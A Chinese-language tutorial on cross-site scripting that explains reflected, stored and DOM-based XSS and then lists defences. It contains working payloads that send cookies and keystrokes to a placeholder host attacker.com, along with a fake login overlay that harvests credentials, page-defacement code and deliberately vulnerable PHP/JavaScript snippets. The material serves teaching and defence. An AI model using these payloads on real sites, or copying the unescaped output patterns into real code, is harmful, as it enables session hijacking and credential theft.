# 跨站脚本攻击（Cross-Site Scripting, XSS）

跨站脚本攻击（XSS）是一种常见的网络安全漏洞，攻击者通过在受信任的网站中注入恶意代码，当用户浏览该网站时，恶意代码会在用户的浏览器中执行。XSS 攻击可能导致用户信息泄露、会话劫持、网站篡改等安全问题。

## XSS 攻击的主要类型

### 1. 反射型 XSS（Reflected XSS）

反射型 XSS 是最常见的 XSS 攻击类型，攻击者将恶意代码嵌入到 URL 中，当用户点击这个 URL 时，恶意代码会被发送到服务器，然后反射回用户的浏览器并执行。

**示例：**

假设一个网站有搜索功能，搜索结果会显示用户的搜索词：

```html
<!-- 服务器端代码 -->
<p>搜索结果: <?php echo $_GET['query']; ?></p>
```

攻击者可以构造如下 URL：
```
https://example.com/search?query=<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>
```

当用户点击这个链接时，恶意脚本会执行并将用户的 cookie 发送到攻击者的服务器。

### 2. 存储型 XSS（Stored XSS）

存储型 XSS 是指恶意代码被存储在目标服务器上（如数据库），当用户访问包含此恶意代码的页面时，代码会被执行。这种攻击通常出现在论坛、评论系统等允许用户提交内容的地方。

**示例：**

假设一个论坛允许用户发表评论：

```html
<!-- 用户提交的评论被存储到数据库 -->
<!-- 后续显示评论时 -->
<div class="comment">
  <?php echo $comment; ?>
</div>
```

攻击者可以提交如下评论：
```html
这是一个很好的文章！<script>var img = new Image(); img.src = "https://attacker.com/steal.php?cookie=" + document.cookie;</script>
```

当其他用户浏览包含这条评论的页面时，恶意脚本会执行，窃取用户的 cookie。

### 3. DOM 型 XSS（DOM-based XSS）

DOM 型 XSS 是通过修改页面的 DOM 环境来进行攻击的，不需要与服务器交互。这种攻击完全发生在客户端。

**示例：**

假设一个网页使用 JavaScript 从 URL 的 hash 部分获取数据并显示：

```html
<script>
  document.getElementById("greeting").innerHTML = "Hello, " + location.hash.substring(1);
</script>
<div id="greeting"></div>
```

攻击者可以构造如下 URL：
```
https://example.com/page.html#<img src=x onerror="alert(document.cookie)">
```

当用户访问这个 URL 时，恶意代码会被插入到页面的 DOM 中并执行。

## 更多 XSS 攻击示例

### 1. 窃取用户会话

```html
<script>
  var img = new Image();
  img.src = "https://attacker.com/steal.php?cookie=" + encodeURIComponent(document.cookie);
</script>
```

### 2. 网站篡改

```html
<script>
  document.body.innerHTML = '<div style="color:red; font-size:50px;">网站已被黑客入侵！</div>';
</script>
```

### 3. 键盘记录

```html
<script>
  document.addEventListener('keypress', function(e) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://attacker.com/log.php?key=' + e.key, true);
    xhr.send();
  });
</script>
```

### 4. 钓鱼攻击

```html
<div style="position:absolute; top:0; left:0; width:100%; height:100%; background-color:white; z-index:9999;">
  <h2>请重新登录</h2>
  <form action="https://attacker.com/steal.php">
    用户名: <input type="text" name="username"><br>
    密码: <input type="password" name="password"><br>
    <input type="submit" value="登录">
  </form>
</div>
```

## XSS 防御措施

1. **输入验证和过滤**：验证用户输入并过滤特殊字符。

2. **输出编码**：在输出用户提供的内容时进行 HTML 编码。
   ```javascript
   function htmlEncode(str) {
     return String(str)
       .replace(/&/g, '&amp;')
       .replace(/</g, '&lt;')
       .replace(/>/g, '&gt;')
       .replace(/"/g, '&quot;')
       .replace(/'/g, '&#39;');
   }
   ```

3. **使用内容安全策略（CSP）**：限制可执行脚本的来源。
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self' trusted-scripts.com;
   ```

4. **使用 HttpOnly 标志**：防止 JavaScript 访问 cookie。
   ```
   Set-Cookie: sessionid=abc123; HttpOnly; Secure
   ```

5. **使用现代框架**：如 React、Vue 等，它们默认会对输出进行转义。

6. **定期进行安全审计和渗透测试**：检测和修复潜在的 XSS 漏洞。

## 总结

XSS 攻击是一种严重的安全威胁，可能导致用户数据泄露、账户被劫持等严重后果。开发人员应该了解不同类型的 XSS 攻击及其防御措施，确保应用程序的安全性。通过实施适当的输入验证、输出编码和其他安全措施，可以有效地防止 XSS 攻击。
